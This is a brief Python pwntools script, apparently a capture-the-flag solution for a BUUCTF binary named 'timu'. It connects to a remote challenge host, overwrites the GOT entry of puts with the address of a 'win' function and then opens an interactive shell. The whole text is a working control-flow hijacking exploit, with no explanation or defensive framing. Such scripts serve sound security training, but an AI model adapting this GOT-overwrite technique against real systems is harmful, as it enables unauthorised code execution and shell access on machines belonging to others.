from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",27878)
elf=ELF("./timu")

puts_got=elf.got["puts"]
win=0x0804854B

sh.sendline(hex(puts_got))
sh.sendline(hex(win))

sh.interactive()
